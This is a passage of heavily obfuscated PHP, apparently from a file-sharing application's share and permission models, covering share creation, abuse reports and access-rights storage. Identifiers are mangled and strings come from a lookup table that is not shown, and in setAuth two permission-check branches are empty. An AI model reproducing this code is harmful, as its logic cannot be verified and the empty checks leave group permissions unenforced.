shareAddSystem($´äï”ğ, $’ŒÈ²â¦) { $»›Ñë”Á =& $_SERVER[ÅÄÇĞô]; $¹åßş¼¢ = $this->_addShareData($´äï”ğ, $’ŒÈ²â¦, $»›Ñë”Á[192]); $this->_shareAuthSet($¹åßş¼¢, $’ŒÈ²â¦[$»›Ñë”Á[2157]]); return $¹åßş¼¢; } private function shareEventAdd($ìõÀÉ, $èğí¡™É, $ÔØàî¸ = "\141\x64\x64") { $ƒ¿­ûÁÒ =& $_SERVER[ÅÄÇĞô]; if (!$ìõÀÉ || $ìõÀÉ == $ƒ¿­ûÁÒ[231]) { return; } if ($ÔØàî¸ == $ƒ¿­ûÁÒ[2158]) { if ($èğí¡™É[$ƒ¿­ûÁÒ[567]] == $ƒ¿­ûÁÒ[91]) { Model($ƒ¿­ûÁÒ[641])->eventShare($ìõÀÉ, $ƒ¿­ûÁÒ[2159]); } if ($èğí¡™É[$ƒ¿­ûÁÒ[671]] == $ƒ¿­ûÁÒ[91]) { Model($ƒ¿­ûÁÒ[641])->eventShare($ìõÀÉ, $ƒ¿­ûÁÒ[2160]); } return; } $Å½–ì = $this->getInfoByPath($ìõÀÉ); $“©Üçì = $ƒ¿­ûÁÒ[2161]; if ($Å½–ì[$ƒ¿­ûÁÒ[567]] == $ƒ¿­ûÁÒ[231] && $èğí¡™É[$ƒ¿­ûÁÒ[567]] == $ƒ¿­ûÁÒ[91]) { $“©Üçì = $ƒ¿­ûÁÒ[2159]; } if ($Å½–ì[$ƒ¿­ûÁÒ[567]] == $ƒ¿­ûÁÒ[91] && $èğí¡™É[$ƒ¿­ûÁÒ[567]] == $ƒ¿­ûÁÒ[231]) { $“©Üçì = $ƒ¿­ûÁÒ[2162]; } if ($Å½–ì[$ƒ¿­ûÁÒ[671]] == $ƒ¿­ûÁÒ[231] && $èğí¡™É[$ƒ¿­ûÁÒ[671]] == $ƒ¿­ûÁÒ[91]) { $“©Üçì = $ƒ¿­ûÁÒ[2160]; } if ($Å½–ì[$ƒ¿­ûÁÒ[671]] == $ƒ¿­ûÁÒ[91] && $èğí¡™É[$ƒ¿­ûÁÒ[671]] == $ƒ¿­ûÁÒ[231]) { $“©Üçì = $ƒ¿­ûÁÒ[2163]; } Model($ƒ¿­ûÁÒ[641])->eventShare($ìõÀÉ, $“©Üçì); return; } private function _addShareData($¡™¡ıƒ, $Âù•ŒÁÍ = array(), $ìûß­ú = false) { $Åêù‘¤² =& $_SERVER[ÅÄÇĞô]; $ºÍÉ‚ = $ìûß­ú == $Åêù‘¤²[192] ? 0 : USER_ID; $Ùûˆíù = array($Åêù‘¤²[494] => $¡™¡ıƒ, $Åêù‘¤²[1788] => $ºÍÉ‚); if ($¡™¡ıƒ == 0) { $Ùûˆíù = array($Åêù‘¤²[2164] => $Âù•ŒÁÍ[$Åêù‘¤²[1280]], $Åêù‘¤²[1788] => $ºÍÉ‚); } if ($–¾³ô¤İ = $this->where($Ùûˆíù)->find()) { return $–¾³ô¤İ[$Åêù‘¤²[673]]; } if ($¡™¡ıƒ == 0) { $š‹”¢õÑ = array($Åêù‘¤²[32] => get_path_this($Âù•ŒÁÍ[$Åêù‘¤²[87]])); } else { $š‹”¢õÑ = Model($Åêù‘¤²[925])->sourceInfo($¡™¡ıƒ); if (!$š‹”¢õÑ) { return !1; } } if (!$Âù•ŒÁÍ[$Åêù‘¤²[1685]]) { $Âù•ŒÁÍ[$Åêù‘¤²[1685]] = $š‹”¢õÑ[$Åêù‘¤²[32]]; } $ßˆÛ½‹ = array($Åêù‘¤²[1788] => $ºÍÉ‚, $Åêù‘¤²[494] => $¡™¡ıƒ, $Åêù‘¤²[1685] => $Åêù‘¤²[12], $Åêù‘¤²[567] => 0, $Åêù‘¤²[671] => 0, $Åêù‘¤²[1280] => $Åêù‘¤²[12], $Åêù‘¤²[385] => $Åêù‘¤²[12], $Åêù‘¤²[989] => $Åêù‘¤²[12], $Åêù‘¤²[2165] => 0, $Åêù‘¤²[2166] => 0, $Åêù‘¤²[856] => 0, $Åêù‘¤²[2167] => $Åêù‘¤²[12], $Åêù‘¤²[2148] => $Åêù‘¤²[12]); $ì àš®  = explode($Åêù‘¤²[50], $Åêù‘¤²[2168]); foreach ($ì àš®  as $ÛšĞòŠÉ) { if (!isset($Âù•ŒÁÍ[$ÛšĞòŠÉ])) { continue; } $ßˆÛ½‹[$ÛšĞòŠÉ] = $Âù•ŒÁÍ[$ÛšĞòŠÉ]; } $Ì×ëö ê = $this->add($ßˆÛ½‹); $¦Íİ¹³ = array($Åêù‘¤²[2148] => short_id($Ì×ëö ê)); $this->where(array($Åêù‘¤²[2169] => $Ì×ëö ê))->save($¦Íİ¹³); return $Ì×ëö ê; } private function _shareAuthSet($»Íœ±¢‰, $úİÁşšö) { $‘€Ò‹  =& $_SERVER[ÅÄÇĞô]; if (!is_array($úİÁşšö)) { return !1; } $…ºëş”ğ = Model($‘€Ò‹ [2110]); $…ºëş”ğ->where(array($‘€Ò‹ [673] => $»Íœ±¢‰))->delete(); $·å™Òî = array(); foreach ($úİÁşšö as $†ôø©öº) { $€êœ¼Á« = SourceModel::TYPE_USER; if ($†ôø©öº[$‘€Ò‹ [191]] == SourceModel::TYPE_GROUP) { $€êœ¼Á« = SourceModel::TYPE_GROUP; } $‡ıĞïãß = array($‘€Ò‹ [673] => $»Íœ±¢‰, $‘€Ò‹ [191] => $€êœ¼Á«, $‘€Ò‹ [574] => intval($†ôø©öº[$‘€Ò‹ [574]]), $‘€Ò‹ [2106] => 0, $‘€Ò‹ [2170] => -1); if ($†ôø©öº[$‘€Ò‹ [2106]]) { $‡ıĞïãß[$‘€Ò‹ [2106]] = $†ôø©öº[$‘€Ò‹ [2106]]; } else { if ($†ôø©öº[$‘€Ò‹ [2170]]) { $‡ıĞïãß[$‘€Ò‹ [2170]] = $†ôø©öº[$‘€Ò‹ [2170]]; } } $·å™Òî[] = $‡ıĞïãß; } return $…ºëş”ğ->addAll($·å™Òî, array(), !0); } public function numViewAdd($áú»ËÂä) { $š¹´¥° =& $_SERVER[ÅÄÇĞô]; $ÒÛ¸˜¦ö = array($š¹´¥°[2169] => $áú»ËÂä); $this->where($ÒÛ¸˜¦ö)->setAdd($š¹´¥°[2165]); } public function numDownloadAdd($ãë«å†¥) { $úô£‘‘ =& $_SERVER[ÅÄÇĞô]; $¹¬¨„Ãñ = array($úô£‘‘[2169] => $ãë«å†¥); $this->where($¹¬¨„Ãñ)->setAdd($úô£‘‘[2166]); } protected function shareEdit($Í•éÑÁ, $»ÀôÒ€) { $Ğ°Ê­—€ =& $_SERVER[ÅÄÇĞô]; $Ì´ÀóÚõ = $this->getInfo($Í•éÑÁ); if (!$Ì´ÀóÚõ) { return !1; } $this->_checkLinkShare($»ÀôÒ€, $Ì´ÀóÚõ); $“»ŒÂµÔ = array(); $©Ö´ëëÄ = explode($Ğ°Ê­—€[50], $Ğ°Ê­—€[2171]); foreach ($©Ö´ëëÄ as $İäìÓì‘) { if (!array_key_exists($İäìÓì‘, $»ÀôÒ€)) { continue; } $“»ŒÂµÔ[$İäìÓì‘] = $»ÀôÒ€[$İäìÓì‘]; } $this->shareEventAdd($Ì´ÀóÚõ[$Ğ°Ê­—€[194]], $»ÀôÒ€, $Ğ°Ê­—€[1967]); $this->where(array($Ğ°Ê­—€[2169] => $Í•éÑÁ))->save($“»ŒÂµÔ); if (isset($»ÀôÒ€[$Ğ°Ê­—€[2157]])) { $this->_shareAuthSet($Í•éÑÁ, $»ÀôÒ€[$Ğ°Ê­—€[2157]]); } return !0; } private function _checkLinkShare($Ù»ÒŠÒê, $Ïò²××) { $ĞŒÂÑ¿¦ =& $_SERVER[ÅÄÇĞô]; if ($Ù»ÒŠÒê[$ĞŒÂÑ¿¦[567]] != $ĞŒÂÑ¿¦[91]) { return; } $ú†Ÿ·€è = $Ïò²××[$ĞŒÂÑ¿¦[90]][$ĞŒÂÑ¿¦[194]]; if ($Ïò²××[$ĞŒÂÑ¿¦[90]][$ĞŒÂÑ¿¦[33]] != $ĞŒÂÑ¿¦[233]) { $ËóµÒ¡ = $this->_folderReport($ú†Ÿ·€è); if (!$ËóµÒ¡) { return; } show_json(LNG($ĞŒÂÑ¿¦[2172]) . $ĞŒÂÑ¿¦[2173] . $ËóµÒ¡, !1); } $«Ë˜Úö = Model($ĞŒÂÑ¿¦[925])->fileInfoGet($Ïò²××[$ĞŒÂÑ¿¦[90]][$ĞŒÂÑ¿¦[194]]); if (!$«Ë˜Úö) { return; } $Š¶é–ÏÂ = $this->shareFileMeta($«Ë˜Úö[$ĞŒÂÑ¿¦[546]]); if (isset($Š¶é–ÏÂ[$ĞŒÂÑ¿¦[453]]) && $Š¶é–ÏÂ[$ĞŒÂÑ¿¦[453]] == $ĞŒÂÑ¿¦[91]) { show_json(LNG($ĞŒÂÑ¿¦[2174]), !1); } } private function _folderReport($ÑæºåËÜ) { $ÃŒ€Ì·ô =& $_SERVER[ÅÄÇĞô]; $¨àëØÖ = array($ÃŒ€Ì·ô[546] => array($ÃŒ€Ì·ô[1112], 0), $ÃŒ€Ì·ô[845] => 3); $œ« ‘ÆÄ = Model($ÃŒ€Ì·ô[2175])->where($¨àëØÖ)->field($ÃŒ€Ì·ô[546])->select(); if (!$œ« ‘ÆÄ) { return !1; } $œ« ‘ÆÄ = array_to_keyvalue($œ« ‘ÆÄ, $ÃŒ€Ì·ô[12], $ÃŒ€Ì·ô[546]); $şÎæº­Ô = $ÃŒ€Ì·ô[50] . $ÑæºåËÜ . $ÃŒ€Ì·ô[50]; $¨àëØÖ = array($ÃŒ€Ì·ô[546] => array($ÃŒ€Ì·ô[7], $œ« ‘ÆÄ), $ÃŒ€Ì·ô[589] => array($ÃŒ€Ì·ô[462], "\45{$şÎæº­Ô}\45"), $ÃŒ€Ì·ô[508] => 0); $ÎÒıÈÊ = Model($ÃŒ€Ì·ô[925])->where($¨àëØÖ)->field($ÃŒ€Ì·ô[2176])->find(); if (!$ÎÒıÈÊ) { return !1; } $­©îïŞ§ = substr($ÎÒıÈÊ[$ÃŒ€Ì·ô[589]], strpos($ÎÒıÈÊ[$ÃŒ€Ì·ô[589]], $şÎæº­Ô)); $¨àëØÖ = array($ÃŒ€Ì·ô[194] => array($ÃŒ€Ì·ô[7], trim($­©îïŞ§, $ÃŒ€Ì·ô[50]))); $Æ“ğä‹„ = Model($ÃŒ€Ì·ô[925])->where($¨àëØÖ)->field($ÃŒ€Ì·ô[32])->select(); $ÍÌãëĞ = array_to_keyvalue($Æ“ğä‹„, $ÃŒ€Ì·ô[12], $ÃŒ€Ì·ô[32]); $ÍÌãëĞ[] = $ÎÒıÈÊ[$ÃŒ€Ì·ô[32]]; return implode($ÃŒ€Ì·ô[8], $ÍÌãëĞ); } protected function remove($Ø°é®Ïª) { $öçáÄ“ª =& $_SERVER[ÅÄÇĞô]; $¢ÀŠ“Ã = is_array($Ø°é®Ïª) ? $Ø°é®Ïª : array($Ø°é®Ïª); for ($ı¬¹Û„ö = 0; $ı¬¹Û„ö < count($¢ÀŠ“Ã); $ı¬¹Û„ö++) { $É×øª…î = $this->getInfo($¢ÀŠ“Ã[$ı¬¹Û„ö]); if ($É×øª…î[$öçáÄ“ª[671]] == $öçáÄ“ª[91]) { Model($öçáÄ“ª[641])->eventShare($É×øª…î[$öçáÄ“ª[194]], $öçáÄ“ª[2163]); } if ($É×øª…î[$öçáÄ“ª[567]] == $öçáÄ“ª[91]) { Model($öçáÄ“ª[641])->eventShare($É×øª…î[$öçáÄ“ª[194]], $öçáÄ“ª[2162]); } $this->shareInfoMofify($É×øª…î, $öçáÄ“ª[2147]); } $ÌÆ¼øØÄ = array($öçáÄ“ª[673] => array($öçáÄ“ª[7], $¢ÀŠ“Ã)); $øƒùãˆ = $this->where($ÌÆ¼øØÄ)->delete(); if ($øƒùãˆ) { Model($öçáÄ“ª[674])->where($ÌÆ¼øØÄ)->delete(); } return $øƒùãˆ; } protected function removeBySource($ÛìÉÈœ’) { $ªê´í¯ =& $_SERVER[ÅÄÇĞô]; $Ğóá±‰‡ = array($ªê´í¯[494] => array($ªê´í¯[495], $ÛìÉÈœ’)); $’Í«ÙÇ = $this->field($ªê´í¯[673])->where($Ğóá±‰‡)->select(); $÷Â¶”ÏÂ = array_to_keyvalue($’Í«ÙÇ, $ªê´í¯[12], $ªê´í¯[673]); if (!$÷Â¶”ÏÂ) { return; } foreach ($’Í«ÙÇ as $¶—™ÚÜ„) { $this->shareInfoMofify($¶—™ÚÜ„, $ªê´í¯[2147]); } $Ğóá±‰‡ = array($ªê´í¯[2169] => array($ªê´í¯[495], $÷Â¶”ÏÂ)); $this->where($Ğóá±‰‡)->delete(); Model($ªê´í¯[674])->where($Ğóá±‰‡)->delete(); } public function listAll($‚š‹¨™õ) { $­ş‡­²Í =& $_SERVER[ÅÄÇĞô]; $ô’Ğõ¨Ã = array(); if ($‚š‹¨™õ[$­ş‡­²Í[1797]]) { $ô’Ğõ¨Ã[$­ş‡­²Í[1797]] = $‚š‹¨™õ[$­ş‡­²Í[1797]]; } if ($‚š‹¨™õ[$­ş‡­²Í[855]]) { $ïØË‘¨ç = $‚š‹¨™õ[$­ş‡­²Í[856]] ? $‚š‹¨™õ[$­ş‡­²Í[856]] : strtotime(date($­ş‡­²Í[2177])); $ô’Ğõ¨Ã[$­ş‡­²Í[234]] = array($­ş‡­²Í[411], array($‚š‹¨™õ[$­ş‡­²Í[855]], $ïØË‘¨ç)); } if ($‚š‹¨™õ[$­ş‡­²Í[33]]) { $ô’Ğõ¨Ã[$‚š‹¨™õ[$­ş‡­²Í[33]]] = 1; } else { $ô’Ğõ¨Ã[] = array($­ş‡­²Í[567] => array($­ş‡­²Í[1112], 0), $­ş‡­²Í[671] => array($­ş‡­²Í[1112], 0), $­ş‡­²Í[2151] => $­ş‡­²Í[2100]); } if ($‚š‹¨™õ[$­ş‡­²Í[2096]]) { $ô’Ğõ¨Ã[] = array($­ş‡­²Í[2148] => $‚š‹¨™õ[$­ş‡­²Í[2096]], $­ş‡­²Í[1685] => array($­ş‡­²Í[462], "\45{$‚š‹¨™õ[$­ş‡­²Í[2096]]}\45"), $­ş‡­²Í[2151] => $­ş‡­²Í[2100]); } $îÒœ¨Ç = $this->_makeOrder()->where($ô’Ğõ¨Ã)->selectPage(20); if (empty($îÒœ¨Ç[$­ş‡­²Í[448]])) { return array(); } $this->_listDataApply($îÒœ¨Ç[$­ş‡­²Í[448]]); return $îÒœ¨Ç; } public function listDataApply($ïòÕû÷º) { $this->_listDataApply($ïòÕû÷º); return $ïòÕû÷º; } private function _listDataApply(&$í‡øØã´) { $¸ó›Ä¨Ú =& $_SERVER[ÅÄÇĞô]; $á²ÀàŠ± = array_to_keyvalue($í‡øØã´, $¸ó›Ä¨Ú[12], $¸ó›Ä¨Ú[1797]); $«ïç‰¼è = Model($¸ó›Ä¨Ú[602])->userListInfo(array_unique($á²ÀàŠ±)); $æ®ó ©Ô = array_to_keyvalue($í‡øØã´, $¸ó›Ä¨Ú[12], $¸ó›Ä¨Ú[194]); $¾ÀñÔ»„ = Model($¸ó›Ä¨Ú[925])->sourceListInfo($æ®ó ©Ô, !0); foreach ($í‡øØã´ as $Ò€ıôæİ => &$°şÇ«Œ¹) { $…ôÍü­¯ = $°şÇ«Œ¹[$¸ó›Ä¨Ú[1797]]; $°şÇ«Œ¹[$¸ó›Ä¨Ú[2178]] = $«ïç‰¼è[$…ôÍü­¯] ? $«ïç‰¼è[$…ôÍü­¯] : !1; if (!$°şÇ«Œ¹[$¸ó›Ä¨Ú[2178]] || $°şÇ«Œ¹[$¸ó›Ä¨Ú[2178]][$¸ó›Ä¨Ú[845]] != $¸ó›Ä¨Ú[91]) { unset($í‡øØã´[$Ò€ıôæİ]); continue; } $×´¹šì = $°şÇ«Œ¹[$¸ó›Ä¨Ú[194]]; $°şÇ«Œ¹[$¸ó›Ä¨Ú[90]] = $¾ÀñÔ»„[$×´¹šì] ? $¾ÀñÔ»„[$×´¹šì] : !1; if ($°şÇ«Œ¹[$¸ó›Ä¨Ú[90]][$¸ó›Ä¨Ú[508]] == $¸ó›Ä¨Ú[91]) { unset($í‡øØã´[$Ò€ıôæİ]); } if ($°şÇ«Œ¹[$¸ó›Ä¨Ú[90]] != $¸ó›Ä¨Ú[231] && !$°şÇ«Œ¹[$¸ó›Ä¨Ú[90]]) { unset($í‡øØã´[$Ò€ıôæİ]); } } unset($°şÇ«Œ¹); $í‡øØã´ = array_values($í‡øØã´); } private function _makeOrder($ëŒğ”¢¹ = '') { $¼†ûĞ¼ê =& $_SERVER[ÅÄÇĞô]; $‹ï­Ê = array($¼†ûĞ¼ê[234], $¼†ûĞ¼ê[856], $¼†ûĞ¼ê[2165], $¼†ûĞ¼ê[2166]); $¤üçŸÃÁ = array($¼†ûĞ¼ê[526] => $¼†ûĞ¼ê[527], $¼†ûĞ¼ê[528] => $¼†ûĞ¼ê[529]); $šÍƒ¯´ = Input::get($¼†ûĞ¼ê[533], $¼†ûĞ¼ê[7], $¼†ûĞ¼ê[500], $‹ï­Ê); $é×Çıìà = Input::get($¼†ûĞ¼ê[534], $¼†ûĞ¼ê[7], $¼†ûĞ¼ê[2179], array($¼†ûĞ¼ê[2093], $¼†ûĞ¼ê[528])); $é×Çıìà = $¤üçŸÃÁ[$é×Çıìà]; $ëŒğ”¢¹ = $ëŒğ”¢¹ . "{$šÍƒ¯´}\x20{$é×Çıìà}"; return $this->order($ëŒğ”¢¹); } public function reportAdd($ÓÖº¬Ù) { $ÆŸì­âÜ =& $_SERVER[ÅÄÇĞô]; $œ¨ØÛÃ’ = array($ÆŸì­âÜ[673] => $ÓÖº¬Ù[$ÆŸì­âÜ[673]], $ÆŸì­âÜ[1797] => USER_ID); if (Model($ÆŸì­âÜ[2175])->where($œ¨ØÛÃ’)->find()) { return !1; } $‰ã¢–Í = array($ÆŸì­âÜ[673] => $ÓÖº¬Ù[$ÆŸì­âÜ[673]], $ÆŸì­âÜ[1685] => $ÓÖº¬Ù[$ÆŸì­âÜ[1685]], $ÆŸì­âÜ[194] => $ÓÖº¬Ù[$ÆŸì­âÜ[194]], $ÆŸì­âÜ[546] => $ÓÖº¬Ù[$ÆŸì­âÜ[546]], $ÆŸì­âÜ[1797] => USER_ID, $ÆŸì­âÜ[33] => $ÓÖº¬Ù[$ÆŸì­âÜ[33]], $ÆŸì­âÜ[529] => $ÓÖº¬Ù[$ÆŸì­âÜ[529]]); return Model($ÆŸì­âÜ[2175])->add($‰ã¢–Í); } public function reportList($ÂİşáÍ) { $¼Íëè“ä =& $_SERVER[ÅÄÇĞô]; $¾³ãÂÃÄ = array(); if ($ÂİşáÍ[$¼Íëè“ä[855]]) { $‰Õ‘Òæ = $ÂİşáÍ[$¼Íëè“ä[856]] ? $ÂİşáÍ[$¼Íëè“ä[856]] : strtotime(date($¼Íëè“ä[2177])); $¾³ãÂÃÄ[$¼Íëè“ä[234]] = array($¼Íëè“ä[411], array($ÂİşáÍ[$¼Íëè“ä[855]], $‰Õ‘Òæ)); } if (isset($ÂİşáÍ[$¼Íëè“ä[33]]) && in_array($ÂİşáÍ[$¼Íëè“ä[33]], array($¼Íëè“ä[91], $¼Íëè“ä[513], $¼Íëè“ä[2180], $¼Íëè“ä[2181], $¼Íëè“ä[2182]))) { $¾³ãÂÃÄ[$¼Íëè“ä[33]] = $ÂİşáÍ[$¼Íëè“ä[33]]; } if (isset($ÂİşáÍ[$¼Íëè“ä[845]]) && in_array($ÂİşáÍ[$¼Íëè“ä[845]], array($¼Íëè“ä[231], $¼Íëè“ä[91], $¼Íëè“ä[513], $¼Íëè“ä[2180]))) { $¾³ãÂÃÄ[$¼Íëè“ä[845]] = $ÂİşáÍ[$¼Íëè“ä[845]]; } $œõ›í½Ÿ = Input::get($¼Íëè“ä[534], $¼Íëè“ä[7], $¼Íëè“ä[2179], array($¼Íëè“ä[2093], $¼Íëè“ä[528])); $å£ñÆ®± = array($¼Íëè“ä[526] => $¼Íëè“ä[527], $¼Íëè“ä[528] => $¼Íëè“ä[529]); $îïŠ›®Ğ = $¼Íëè“ä[2183] . $å£ñÆ®±[$œõ›í½Ÿ]; $Ó•¸Ô› = Model($¼Íëè“ä[2175])->where($¾³ãÂÃÄ)->order($îïŠ›®Ğ)->selectPage(20); if (empty($Ó•¸Ô›[$¼Íëè“ä[448]])) { return array(); } $íÍºİìÎ = array_to_keyvalue_group($Ó•¸Ô›[$¼Íëè“ä[448]], $¼Íëè“ä[845], $¼Íëè“ä[673]); if (!empty($íÍºİìÎ[0])) { $ÂİşáÍ = $íÍºİìÎ[0]; $¾³ãÂÃÄ = array($¼Íëè“ä[673] => array($¼Íëè“ä[7], $ÂİşáÍ)); $ŞÅÇâ¹¹ = $this->where($¾³ãÂÃÄ)->field($¼Íëè“ä[673])->select(); $ŞÅÇâ¹¹ = array_to_keyvalue($ŞÅÇâ¹¹, $¼Íëè“ä[12], $¼Íëè“ä[673]); $¿²§©¿ğ = array_diff($ÂİşáÍ, $ŞÅÇâ¹¹); if (!empty($¿²§©¿ğ)) { foreach ($Ó•¸Ô›[$¼Íëè“ä[448]] as $à²Ûİ‡© => $ø‚æ”Ì­) { if (in_array($ø‚æ”Ì­[$¼Íëè“ä[673]], $¿²§©¿ğ)) { unset($Ó•¸Ô›[$¼Íëè“ä[448]][$à²Ûİ‡©]); } } } } $this->_listDataApply($Ó•¸Ô›[$¼Íëè“ä[448]]); return $Ó•¸Ô›; } public function reportStatus($èÙèÄ•) { $´àêÙ²ƒ =& $_SERVER[ÅÄÇĞô]; $Ú†è‘û = array($´àêÙ²ƒ[478] => $èÙèÄ•[$´àêÙ²ƒ[478]]); $­óÕœ¸á = Model($´àêÙ²ƒ[2175])->where($Ú†è‘û)->field($´àêÙ²ƒ[2184])->find(); if (!$­óÕœ¸á) { return !1; } $¾İ¶¢õÉ = array($´àêÙ²ƒ[845] => $èÙèÄ•[$´àêÙ²ƒ[845]]); if ($èÙèÄ•[$´àêÙ²ƒ[845]] == $´àêÙ²ƒ[2180] && $­óÕœ¸á[$´àêÙ²ƒ[845]] == $´àêÙ²ƒ[2180]) { $¾İ¶¢õÉ[$´àêÙ²ƒ[845]] = 0; } $‰ŸöÕ•› = Model($´àêÙ²ƒ[2175])->where($Ú†è‘û)->save($¾İ¶¢õÉ); if ($èÙèÄ•[$´àêÙ²ƒ[845]] == $´àêÙ²ƒ[513]) { if ($­óÕœ¸á[$´àêÙ²ƒ[546]] != $´àêÙ²ƒ[231] && $this->shareFileMeta($­óÕœ¸á[$´àêÙ²ƒ[546]])) { $this->shareFileMeta($­óÕœ¸á[$´àêÙ²ƒ[546]], 0); } $this->remove($­óÕœ¸á[$´àêÙ²ƒ[673]]); return !0; } if ($‰ŸöÕ•› && $èÙèÄ•[$´àêÙ²ƒ[845]] == $´àêÙ²ƒ[2180]) { $×ƒéàÚ¹ = $¾İ¶¢õÉ[$´àêÙ²ƒ[845]] == $´àêÙ²ƒ[2180] ? 1 : 0; $this->shareFileMeta($­óÕœ¸á[$´àêÙ²ƒ[546]], $×ƒéàÚ¹); $this->removeByFile($­óÕœ¸á[$´àêÙ²ƒ[546]]); } return $‰ŸöÕ•›; } private function removeByFile($‰ÊœÑ€) { $½÷§ß« =& $_SERVER[ÅÄÇĞô]; $Ú—·¦Úº = Model($½÷§ß«[925])->where(array($½÷§ß«[546] => $‰ÊœÑ€))->field($½÷§ß«[194])->select(); $ü’ğÍİè = array_to_keyvalue($Ú—·¦Úº, $½÷§ß«[12], $½÷§ß«[194]); $‡­˜ÔŞ = array($½÷§ß«[194] => array($½÷§ß«[7], $ü’ğÍİè), $½÷§ß«[567] => 1); $Ú—·¦Úº = $this->where($‡­˜ÔŞ)->field($½÷§ß«[673])->select(); if (empty($Ú—·¦Úº)) { return; } $§·ı‘¸ù = array_to_keyvalue($Ú—·¦Úº, $½÷§ß«[12], $½÷§ß«[673]); $this->remove($§·ı‘¸ù); } private function shareFileMeta($ôÕ¾‹’¼, $¥è¤©É§ = null) { $§†§‘µ =& $_SERVER[ÅÄÇĞô]; $¼¯¸é¸Ù = array($§†§‘µ[546] => $ôÕ¾‹’¼, $§†§‘µ[97] => $§†§‘µ[2185]); if (is_null($¥è¤©É§)) { return Model($§†§‘µ[2186])->where($¼¯¸é¸Ù)->find(); } $¼¯¸é¸Ù[$§†§‘µ[453]] = $¥è¤©É§; Model($§†§‘µ[2186])->add($¼¯¸é¸Ù, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\157\165\x72\x63\x65\x5f\x61\x75\x74\150"; public function getAuth($£Öõıû») { $ø•·ğåù =& $_SERVER[ÅÄÇĞô]; $ä«£âù° = $this->sourceAuthSelect($£Öõıû»); $ı—ö‰î = array(); $¨¹‚œ„¾ = array(); $ıß§¬Š = 2 << 25; foreach ($ä«£âù° as $º¯…†¤“) { $É‡Ïñ› = Model($ø•·ğåù[576])->listData($º¯…†¤“[$ø•·ğåù[2106]]); if (!$É‡Ïñ›) { continue; } $ı—ö‰î[] = $º¯…†¤“; $ŠªœÆéÒ = 0; if ($º¯…†¤“[$ø•·ğåù[191]] == SourceModel::TYPE_GROUP) { $ŠªœÆéÒ = $ıß§¬Š * 2; } if ($º¯…†¤“[$ø•·ğåù[191]] == SourceModel::TYPE_USER) { $ŠªœÆéÒ = $ıß§¬Š; } if ($º¯…†¤“[$ø•·ğåù[191]] == SourceModel::TYPE_USER && $º¯…†¤“[$ø•·ğåù[574]] == $ø•·ğåù[231]) { $ŠªœÆéÒ = 0; } $¨¹‚œ„¾[] = $É‡Ïñ›[$ø•·ğåù[490]] + $ŠªœÆéÒ; } array_multisort($¨¹‚œ„¾, SORT_DESC, $ı—ö‰î); return $ı—ö‰î; } public function sourceAuthSelect($”ÊĞÏ•ß) { $à½º›‰¨ =& $_SERVER[ÅÄÇĞô]; static $‰¼Í› = array(); $°Â§¥Ì½ = is_array($”ÊĞÏ•ß) ? !1 : !0; if ($°Â§¥Ì½) { $”ÊĞÏ•ß = array($”ÊĞÏ•ß); } $û‡çÚíì = array(); foreach ($”ÊĞÏ•ß as $ƒÚçĞà) { if (isset($‰¼Í›[$ƒÚçĞà])) { $û‡çÚíì[$ƒÚçĞà] = $‰¼Í›[$ƒÚçĞà]; } } if (count($û‡çÚíì) == count($”ÊĞÏ•ß)) { return $°Â§¥Ì½ ? $û‡çÚíì[$”ÊĞÏ•ß[0]] : $û‡çÚíì; } $û®´Æº¸ = $à½º›‰¨[2187]; $¶Äƒâµ¦ = array($à½º›‰¨[194] => array($à½º›‰¨[7], $”ÊĞÏ•ß)); $ˆÔöã°ä = $this->field($û®´Æº¸)->order($à½º›‰¨[478])->where($¶Äƒâµ¦)->select(); $§äŸô¢Â = array_to_keyvalue_group($ˆÔöã°ä, $à½º›‰¨[194]); foreach ($”ÊĞÏ•ß as $ƒÚçĞà) { $‰¼Í›[$ƒÚçĞà] = $§äŸô¢Â[$ƒÚçĞà] ? $§äŸô¢Â[$ƒÚçĞà] : array(); } if ($°Â§¥Ì½) { return $ˆÔöã°ä; } return $§äŸô¢Â; } public function setAuth($Œ·¼ĞÛ, $ı‚Ìû‡°) { $»´à‹ºÈ =& $_SERVER[ÅÄÇĞô]; $×Î¦°ãİ = Model($»´à‹ºÈ[1444])->sourceInfo($Œ·¼ĞÛ); if (!$×Î¦°ãİ) { return !1; } if ($×Î¦°ãİ[$»´à‹ºÈ[191]] != SourceModel::TYPE_GROUP) { return !1; } $í²¬ºÒŠ = 1; $ş¨‹ ·Ã = $×Î¦°ãİ[$»´à‹ºÈ[574]]; if ($ş¨‹ ·Ã != $í²¬ºÒŠ) { $Ñ˜ÁóöÅ = array($»´à‹ºÈ[1998] => $ş¨‹ ·Ã); $””­—Ûû = Model($»´à‹ºÈ[2092])->field($»´à‹ºÈ[1797])->where($Ñ˜ÁóöÅ)->select(); $””­—Ûû = array_to_keyvalue($””­—Ûû, $»´à‹ºÈ[12], $»´à‹ºÈ[1797]); } $éç¢ ‹ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $ÒĞİ§—… = array(); foreach ($ı‚Ìû‡° as $‰À—¯ßµ) { if (!in_array($‰À—¯ßµ[$»´à‹ºÈ[191]], $éç¢ ‹)) { show_json(LNG($»´à‹ºÈ[2188]), !1); } if ($ş¨‹ ·Ã != $í²¬ºÒŠ) { if ($‰À—¯ßµ[$»´à‹ºÈ[191]] == SourceModel::TYPE_GROUP) { } if ($‰À—¯ßµ[$»´à‹ºÈ[574]] != 0 && !in_array($‰À—¯ßµ[$»´à‹ºÈ[574]], $””­—Ûû)) { } } if ($‰À—¯ßµ[$»´à‹ºÈ[574]] == 0) { $‰À—¯ßµ[$»´à‹ºÈ[191]] = SourceModel::TYPE_USER; } $ÒĞİ§—…[] = array($»´à‹ºÈ[194] => $Œ·¼ĞÛ, $»´à‹ºÈ[191] => intval($‰À—¯ßµ[$»´à‹ºÈ[191]]), $»´à‹ºÈ[574] => intval($‰À—¯ßµ[$»´à‹ºÈ[574]]), $»´à‹ºÈ[2106] => intval($‰À—¯ßµ[$»´à‹ºÈ[2106]]) ? intval($‰À—¯ßµ[$»´à‹ºÈ[2106]]) : 0, $»´à‹ºÈ[2170] => intval($‰À—¯ßµ[$»´à‹ºÈ[2170]]) ? intval($‰À—¯ßµ[$»´à‹ºÈ[2170]]) : -1); } $this->where(array($»´à‹ºÈ[494] => $Œ·¼ĞÛ))->delete(); $this->addAll($ÒĞİ§—…); return !0; } public function authClear($”¥§Â‹ú) { $‚‰•º›¥ =& $_SERVER[ÅÄÇĞô]; $İ®š©£Í = Model($‚‰•º›¥[1444])->sourceInfo($”¥§Â‹ú); $úÉ¹…Ò¸ = 